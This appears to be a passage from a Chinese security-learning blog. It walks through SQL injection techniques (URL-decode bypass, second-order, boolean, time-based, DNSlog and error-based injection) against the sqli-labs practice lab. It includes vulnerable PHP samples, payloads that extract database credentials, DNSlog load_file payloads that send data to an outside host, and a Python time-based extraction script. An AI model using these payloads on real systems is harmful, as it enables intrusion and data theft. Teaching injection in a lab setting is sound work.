<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;id&#x27;]))&#123;</span><br><span class="line">$id = mysql_real_escape_string($_GET[&#x27;id&#x27;]);</span><br><span class="line">$id = urldecode($id);</span><br><span class="line">$sql = &quot;select * from users where id=&#x27;$id&#x27; limit 0,1&quot;;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">$row=mysql_fetch_array($result);</span><br><span class="line">if($row)</span><br><span class="line">&#123;</span><br><span class="line">xxxxx</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">xxxxx</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="练习：-1"><a href="#练习：-1" class="headerlink" title="练习："></a>练习：</h3><p>id=1’时会被转义为id=1&#39;</p>
<p>变为id=1%2527时，回显为1’并报错可以发现会存在sql注入漏洞接下来直接按照之前的套路</p>
<p>比如</p>
<p>id=%2527 and union select 1,(select user()),3–+</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id =&#x27; union select 1,(select user()),3--+&#x27;</span><br></pre></td></tr></table></figure>
<p>如果是sqlmap的话跟宽字节注入一个道理需要键入相关参数<br>比如sqlmap -u ‘url?id=1%2527’就可以跑</p>
<p>黑盒测试：</p>
<p>在可能的注入点键入%2527,之后进行注入测试</p>
<p>白盒测试：</p>
<ol>
<li>是否使用Urldecode函数</li>
<li>urldecode函数是否存在转义方法之后<h2 id="-1"><a href="#-1" class="headerlink" title></a></h2><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2></li>
</ol>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>第一步：插入恶意数据：</p>
<p>第一次进行数据库插入数据的时候，仅仅对特殊字符进行了转义，在写入的时候保留了原来的数据，但是数据本身是含有恶意内容的</p>
<p>第二步：引用恶意数据：</p>
<p>将数据存入到数据库之后，开发者认为数据是可信的，在下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一步的检验和处理，就会造成sql的二次注入</p>
<p>过程：</p>
<p>寻找插入数据库并会转义的操作，输入参数，参数经过转义函数1&#39;，参数进入数据库存储还原为1’，寻找另一处引用数据的操作，将1’从数据库中取出，取出后直接给变量并代入sql，sql注入触发</p>
<p>代码实现：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$sql = &#x27;select * from users order by id asc&#x27;;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">$num = mysql_num_rows($result);</span><br><span class="line">for ($j = 0;$j&lt;$num;++$j)</span><br><span class="line">&#123;</span><br><span class="line">  $row = mysql_fetch_array($result);</span><br><span class="line">  $username = $row[1];</span><br><span class="line">  $sql_detail = &quot;select * from users where username =&#x27;$username&#x27;&quot;;</span><br><span class="line">  $result_detail=mysql_query($sql_detail);</span><br><span class="line">  $num_detail=mysql_num_rows($result_detail);</span><br><span class="line">  for($i =0;$i&lt;$num_detail;++$i)&#123;</span><br><span class="line">    $row_detail =mysql_fetch_array($result_detail);</span><br><span class="line">    xxxxxx</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="练习：less24"><a href="#练习：less24" class="headerlink" title="练习：less24"></a>练习：less24</h3><p>点击注册admin’# 密码123，然后修改密码为1314并键入原密码123</p>
<p>查看数据库里可以看到admin这个用户密码被改成了1314，而不是admin’#这个用户的密码被修改了</p>
<p>具体的sql语句是这样</p>
<p>$sql=”update users set password=’1314’ where username=’admin’#’ and password = ‘$curr_pass’”;</p>
<p>所以我们可以这样注入</p>
<p>创建一个这样的用户</p>
<p>1’ union select 1,user(),3# 密码123</p>
<p>然后查看用户列表，可以看到当前用户名能显示我们数据库的当前用户</p>
<p>执行的语句为$sql_detail = ‘select * from users where username = ‘1’ union select 1,user(),3#’”;</p>
<p>这样就能到比较直观的二次注入的效果，不断插入我们的语句就能查询到我们想要的信息</p>
<h3 id="-2"><a href="#-2" class="headerlink" title></a></h3><h3 id="防御：-1"><a href="#防御：-1" class="headerlink" title="防御："></a>防御：</h3><p>对外部提交的数据，需要更加严谨的对待，程序内部的数据调用，也要进行严格的检查，一不小心，测试者就能将特定的sql语句代入到查询中</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/20/SQL/%E7%9B%B2%E6%B3%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/pic.jpg">
      <meta itemprop="name" content="D0gekong">
      <meta itemprop="description" content="散人的漫漫学习路">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hack the world">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/03/20/SQL/%E7%9B%B2%E6%B3%A8/" class="post-title-link" itemprop="url">盲注</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2022-03-20 15:40:35 / 修改时间：15:41:14" itemprop="dateCreated datePublished" datetime="2022-03-20T15:40:35+08:00">2022-03-20</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="布尔盲注："><a href="#布尔盲注：" class="headerlink" title="布尔盲注："></a>布尔盲注：</h2><p>代码存在sql注入漏洞，然而页面既不会回显数据，也不会回显错误信息，只返回right和wrong。这里我们可以通过构造语句，来判断数据库信息的正确性，再通过页面的真和假来识别我们的判断是否正确，这就是布尔盲注</p>
<p>代码实现：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$sql = &quot;select * from users where id = &#x27;$id&#x27; limit 0,1&quot;;</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">if($row)</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;right&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;wrong&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>示意过程：<br>正常请求，id=1，返回id=1的数据，错误请求id=1’，返回与正确页面不同的页面 （如果页面返回假，说明系统执行的SQL语句为假）</p>
<p>比如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and left((select version(),1)=5--+</span><br></pre></td></tr></table></figure>

<h3 id><a href="#" class="headerlink" title></a></h3><h3 id="使用语句："><a href="#使用语句：" class="headerlink" title="使用语句："></a>使用语句：</h3><ol>
<li><p>left():left(database(),1)&gt;’s’<br>database()显示数据库名称，left(a,b)从左侧开始截取a的前b位</p>
</li>
<li><p>regexp:select user() regexp ‘^r’</p>
</li>
</ol>
<p> 正则表达式的用法，user()结果为root,regexp为匹配root的正则表达式</p>
<p> 3.like:select user() like ‘ro%’</p>
<p>与regexp类似，使用like进行匹配</p>
<p> 4.substr(),ascii():ascii(substr((select database()),1,1))=98</p>
<p>substr(a,b,c)从b位置开始，截取字符串a的c长度，ascii()将某个字符转换为ascii的值</p>
<p> 5.ord(),mid():ord(mid((select user()),1,1))=114</p>
<p>mid(a,b,c)从位置b开始，截取a字符串的c位ord()函数同ascii()，将字符转为ascii值</p>
<h3 id="练习："><a href="#练习：" class="headerlink" title="练习："></a>练习：</h3><h3 id="环境：sqli-lab-less-8"><a href="#环境：sqli-lab-less-8" class="headerlink" title="环境：sqli-lab less 8"></a>环境：sqli-lab less 8</h3><p>id=1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&#x27;1&#x27; limit 0,1</span><br></pre></td></tr></table></figure>
<p>回显正确you are in<br>id=1’</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&#x27;1&#x27; &#x27; limit 0,1</span><br></pre></td></tr></table></figure>
<p>回显消失<br>id=1’ and ‘1’ = ‘1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id = &#x27;1&#x27; and &#x27;1&#x27; =&#x27;1&#x27; limit 0,1</span><br></pre></td></tr></table></figure>
<p>回显正确you are in<br>将后者的逻辑判断改为2，回显消失，可以判断存在sql注入漏洞</p>
<p>使用left()来进行尝试</p>
<p>id=1’ and left((select database()),1)=’s’–+</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&#x27;1&#x27; and left((select database()),1)=&#x27;s&#x27; --&#x27;limit 0,1</span><br></pre></td></tr></table></figure>
<p>回显成功you are in<br>通过此类方法就能对库名，表名，列名进行查询</p>
<p>对表名查询</p>
<p>id=1’ and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=’e’–+</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&#x27;1&#x27; and left((select  table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&#x27;e&#x27;--+</span><br></pre></td></tr></table></figure>
<p>回显成功 判断正确<br>注入流程就是这样，我们可以使用BP进一步提升效率，为字符添加变量，自动化跑（注意下数据库命名规则是a-z,0-9,_</p>
<p>尝试切换为regexp试试</p>
<p>id=1’ and (select database()) regexp ‘^s’ –+</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id = &#x27;1&#x27; and (select database()) regexp &#x27;^s&#x27; --+&#x27; limit 0,1</span><br></pre></td></tr></table></figure>
<p>回显成功判断正确<br>id=1’ and (select table_name from information_schema.tables where table_schema=database() limit 0,1),1) regexp ‘^e’ –+</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&#x27;1&#x27; and (select table_name from information_schema.tables where table_schema=database() limit 0,1),1) regexp &#x27;^e&#x27; --+&#x27; limit 0,1</span><br></pre></td></tr></table></figure>
<p>回显成功判断正确，如果要判断第二位，就直接在e后面加上自己想测的字符<br>切换为like</p>
<p>id=1’ and (select table_name from information_schema.tables where table_schema=database() limit 0,1) like ‘e%’ –+</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&#x27;1&#x27; and(select table_name from information_schema.tables where table_schema=database() limit 0,1) like &#x27;e%&#x27; --+ limit 0,1</span><br></pre></td></tr></table></figure>
<p>这种表示匹配以e开头的字符串，后面同理regexp<br>切换为substr以及ascii</p>
<p>id=1’ and ascii(substr((select database()),1,1) = 115 –+</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&#x27;1&#x27; and ascii(substr((select database()),1,1) = 98 --+&#x27; limit ,1</span><br></pre></td></tr></table></figure>
<p>截取了从第一位字符开始长度为一的字符的ascii并判断是否等于115，这里是回显成功判断正确<br>然后查表</p>
<p>id=1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1) = 115 –+</p>
<p>这里回显失败判断错误，就可以借助Bp爆破字符了，爆破可得101时正确，接着调整字符长度和ASCII的值，直至爆破结束</p>
<h2 id="-1"><a href="#-1" class="headerlink" title></a></h2><h2 id="时间盲注："><a href="#时间盲注：" class="headerlink" title="时间盲注："></a>时间盲注：</h2><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p>代码存在sql注入漏洞，然而页面既不会回显数据，也不会回显错误信息，语句执行后也不提示真假，我们不能通过页面的内容来进行判断，这里我们可以通过构造语句，通过页面响应的时长，来判断信息，这就是时间盲注</p>
<h3 id="-2"><a href="#-2" class="headerlink" title></a></h3><h3 id="代码实现："><a href="#代码实现：" class="headerlink" title="代码实现："></a>代码实现：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$sql = &#x27;select * from users where id=&#x27;$id&#x27; limit 0,1&#x27;;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">if($row)</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="示意过程"><a href="#示意过程" class="headerlink" title="示意过程:"></a>示意过程:</h3><p>登陆正常请求，name=admin&amp;pwd=1返回登陆成功的页面,在不知道账号密码的情况发送登录请求，返回登陆失败的页面，构造sql语句，发送登陆请求，返回登陆失败页面，构造语句让程序延时执行，判断信息</p>
<p>构造逻辑语句，通过条件语句进行判断，为真则立即执行，否则延时执行</p>
<p>核心语法：if(left(user(),1)=’a’,0,sleep(3));通过sql语句取到某个值，用left去user左侧的第一个字符，如果等于a，就立即执行，错误就延时3秒执行</p>
<p>真实场景:if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23</p>
<p>插入想要查询的数据，进行字符串截取，再进行比对</p>
<h3 id="练习：-1"><a href="#练习：-1" class="headerlink" title="练习："></a>练习：</h3><p>环境:sqli-lab less10</p>
<p>id=1 id=1’ id=1’ and ‘1’ =’2</p>
<p>进行一些简单的逻辑判断，均为一致的回显</p>
<p>采取上述时间盲注</p>
<p>id=1’ and if(left(user(),1)=’a’,0,sleep(3))–+</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&#x27;1&#x27; and if(left(user(),1)=&#x27;a&#x27; , 0 ,sleep(3))--+&#x27; limit 0,1</span><br></pre></td></tr></table></figure>
<p>很明显页面延迟了刷新，将字符a变为r，页面立即执行，通过这种方式就能对数据库的数据进行查询<br>id=1’ and if(left(select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=’e’,0,sleep(3))–+</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&#x27;1&#x27; and if(left(select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&#x27;e&#x27;,0,sleep(3))--+&#x27; limit 0 ,1</span><br></pre></td></tr></table></figure>
<p>页面立即执行了，可见就是表名第一个字符就是E，但是这种效率会比较低这里对时间盲注比较推荐使用工具或者脚本<br>时间盲注脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url=&#x27;&#x27;</span><br><span class="line">database=&#x27;select schema_name from information_schema.schemata&#x27;</span><br><span class="line">column = &#x27;select column_name from information_schema.columns where table_name=&quot;table_name&quot;&#x27;</span><br><span class="line">table = &#x27;select table_name from information_schema.tables where table_schema=database()&#x27;</span><br><span class="line"></span><br><span class="line">result = &#x27;&#x27;</span><br><span class="line">for i in range(1,20):</span><br><span class="line">    for j in range(48,122):</span><br><span class="line">        payload = &#x27;&quot; and if(ascii(substr((&#123;&#125; limit 0,1),&#123;&#125;,1),sleep(2),1)--+&#x27;.format(database,i,j)</span><br><span class="line">        stime=time.time()</span><br><span class="line">        r = requests.get(url+payload)</span><br><span class="line">        etime = time.time()</span><br><span class="line">        if etime-stime ==2:</span><br><span class="line">            result += chr(j)</span><br><span class="line">            print(result)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
<p>这里脚本先对库名进行爆破，爆完库名修改为表名，列名即可</p>
<h2 id="-3"><a href="#-3" class="headerlink" title></a></h2><h2 id="Dnslog盲注"><a href="#Dnslog盲注" class="headerlink" title="Dnslog盲注"></a>Dnslog盲注</h2><p>每个网站都有对应的域名比如<a target="_blank" rel="noopener" href="https://www.test.com,每/">test.com</a> ，同样每个域名都有对应的ip地址，而将ip地址与域名这两者互相转换的中间人就是DNS，这两者每次转换都会留下一定的记录，我们就可以将这个称为dnslog，其实就是记录用户访问域名的信息</p>
<p>原理：代码存在sql注入漏洞，然而页面既不会回显数据，也不会回显错误信息，我们可以通过布尔以及时间盲注获得内容，但整个过程效率低，需要发送很多请求进行判断，很可能触发安全设备的防护，所以需要一种方式减少请求，直接回显数据，这里可以使用dnslog实现注入</p>
<p>代码实现：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$sql = &quot;select * from users where id = &#x27;$id&#x27; limit 0,1&quot;;</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">if($row)</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;right&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;wrong&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>平台:ceye.io dns在解析的时候会留下日志，通过读取多级域名的解析日志，获取请求信息比如 curl xx.dnsurl，xx这里就是我们可以自主输入的命令字符，如果输入的whoami,就会返回当前用户<br>另外mysql的load_file可以发起请求</p>
<p>例子:select load_file(concat(‘\\‘,’test’,’mysql.dnsurl\abc’));</p>
<p>构造语句,利用Load_file函数发起请求，使用dnslog接受请求，获取数据</p>
<p>核心语法:select load_file(concat(‘\\‘,(select database(),’mysql.dnsurl\abc’));</p>
<p>通过sql语句查询内容，作为请求的一部分发送至dnslog，只要对这一部分的语句进行构造，就能实现有回显的sql注入，值得注意的是，这些数据格式和内容都有限制，需要处理</p>
<h3 id="练习：-2"><a href="#练习：-2" class="headerlink" title="练习："></a>练习：</h3><p>环境：sqli-lab less9</p>
<p>id=1 或者其他逻辑判断</p>
<p>回显无效无法判断，如果有注入点就必然是盲注</p>
<p>采取dnslog盲注</p>
<p>id=1’ and select load_file(concat(‘\\‘,(select database(),’mysql.dnsurl\abc’));</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id =&#x27;1&#x27; and select load_file(concat(&#x27;\\\\&#x27;,(select database(),&#x27;mysql.dnsurl\\abc&#x27;));--+&#x27;</span><br></pre></td></tr></table></figure>
<p>前去dnslog平台就可以看到库名<br>然后查表名</p>
<p>id=1’ and select load_file(concat(‘\\‘,(select table_name from information_schema.tables where table_schema=database() limit 0,1),’mysql.dnsurl\abc’));–+</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&#x27;id=1&#x27; and select load_file(concat(&#x27;\\\\&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&#x27;mysql.dnsurl\\abc&#x27;));--+&#x27;</span><br></pre></td></tr></table></figure>
<p>可以看到表名，列名就按照老套路继续走<br>但是其实效率还是不高，推荐使用脚本跑</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/19/SQL/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/pic.jpg">
      <meta itemprop="name" content="D0gekong">
      <meta itemprop="description" content="散人的漫漫学习路">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hack the world">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/03/19/SQL/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">报错注入</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2022-03-19 18:29:10 / 修改时间：18:29:43" itemprop="dateCreated datePublished" datetime="2022-03-19T18:29:10+08:00">2022-03-19</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>原理：</p>
<p>构造payload让信息通过错误提示回显出来</p>
<p>应用场景：</p>
<p>查询不回显内容，会打印错误信息，update.insert等语句，会打印错误信息</p>
<p>代码实现：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if($row)</span><br><span class="line">&#123;</span><br><span class="line">echo&quot;your login name:&#x27;.$row[&#x27;username&#x27;];</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>举例：<br>正常请求：</p>
<p>id=1,返回id=1的数据</p>
<p>错误请求:</p>
<p>id=1’，返回错误信息，语法错误，如果能让错误信息中返回数据库中的内容，即可实现Sql注入，所以我们要想办法构造语句，让错误信息可以显示更多我们想查询的内容</p>
<h2 id><a href="#" class="headerlink" title></a></h2><h2 id="方法："><a href="#方法：" class="headerlink" title="方法："></a>方法：</h2><p>环境：sqli-lab</p>
<p><strong>1.floor():</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from information_schema.tables group by concat((select version()),floor(rand(0)*2));</span><br></pre></td></tr></table></figure>
<p><strong>group by 对rand函数进行操作时产生错误</strong><br><strong>2.extractvalue():</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(1,concat(0x7e,(select user()),0x7e));</span><br></pre></td></tr></table></figure>
<p><strong>XPath语法错误产生报错</strong><br><strong>3.updatexml():</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select updatexml(1,concat(0x7e,(select user(),0x7e),1);</span><br></pre></td></tr></table></figure>
<p><strong>Xpath语法错误产生报错</strong><br><strong>floor():</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from information_schema.tables group by concat((select version()),floor(rand(0)*2));</span><br></pre></td></tr></table></figure>
<p>concat:连接字符串<br>floor:取float的整数值</p>
<p>rand:取0-1之间的随机浮点值</p>
<p>group by:根据一个或多个列对结果集进行分组并有排序功能</p>
<p>这其中导致报错的就是group by和floor</p>
<p>当id=1’ and select count(*) from information_schema.tables group by concat((select version(),floor(rand(0)*2))–+</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id = &#x27;1&#x27; and select count(*) from information_schema.tables group by concat((select version(),floor(rand(0)*2))--+&#x27;</span><br></pre></td></tr></table></figure>
<p>可以看到报错回显了有关版本的信息，即我们插入的select version()<br>我们也可以继续查询user(),database()等</p>
<p>按照老方法就是查库查表查列</p>
<p>这里拿查表做例子：</p>
<p>id=1’ and select count(*) from information_schema.tables group by concat((select table_name from information_schema.tables where table_schema=database()),floor(rand(0)*2))–+</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id = &#x27;1&#x27; and select count(*) from information_schema.tables group by concat((select table_name from information_schema.tables where table_schema=database()),floor(rand(0)*2))--+&#x27;</span><br></pre></td></tr></table></figure>
<p>或者采用另外一种查数据<br>id=1’ and select count(*) from information_schema.tables group by concat(0x7e,(select concat(username,0x7e,password) from 表名),floor(rand(0)*2))–+</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id = &#x27;1&#x27; and select count(*) from information_schema.tables group by concat(0x7e,(select concat(username,0x7e,password) from 表名),floor(rand(0)*2))--+</span><br></pre></td></tr></table></figure>

<p>这里如果对返回的数据条数有限制，可以用concat_ws或者limit进行绕过，如果是limit的话，每次都只需要对数字参数进行修改即可，这里可以BP的爆破模块进行替代</p>
<h3 id="-1"><a href="#-1" class="headerlink" title></a></h3><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue():"></a>extractvalue():</h3><p>extractvalue:接收两个参数，第一个XML文档，第二个Xpath语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select extractvalue(1,concat(0x7e,(select user()),0x7e));</span><br></pre></td></tr></table></figure>
<p>在上述例句中位置插入sql查询语句即可，报错就会返回我们想要查询的信息</p>
<h3 id="updatexml-："><a href="#updatexml-：" class="headerlink" title="updatexml()："></a>updatexml()：</h3><p>updatexml：接收三个参数，第一个XML文档，第二个Xpath语句，第三个字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select updatexml(1,concat(0x7e,(select user()),0x7e),1);</span><br></pre></td></tr></table></figure>
<p>在上述例句中位置插入sql查询语句即可，报错就会返回我们想要查询的信息，原理与extractvalue一样，只是多了一个参数<br>例子：</p>
<p>id=1’ and updatexml(1,concat(0x7e,(select user()),1)–+</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&#x27;1&#x27; and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+&#x27;</span><br></pre></td></tr></table></figure>

<p>id=1’ and updatexml(1,concat(0x7e,(select concat(username,0x7e,password) from users limit 0,1),0x7e),1)–+</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&#x27;1&#x27; and updatexml(1,concat(0x7e,(select concat(username,0x7e,password) from users limit 0,1)0x7e),1)--+&#x27; </span><br></pre></td></tr></table></figure>

<p>回过头来看，报错注入其实大框架是不变，我们只需要改变查询内容即可就能实现注入，主要是熟练度。(但是报错注入对返回的长度有限制32位，可以用substr对字符进行截取即可）</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/19/SQL/SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/pic.jpg">
      <meta itemprop="name" content="D0gekong">
      <meta itemprop="description" content="散人的漫漫学习路">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hack the world">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
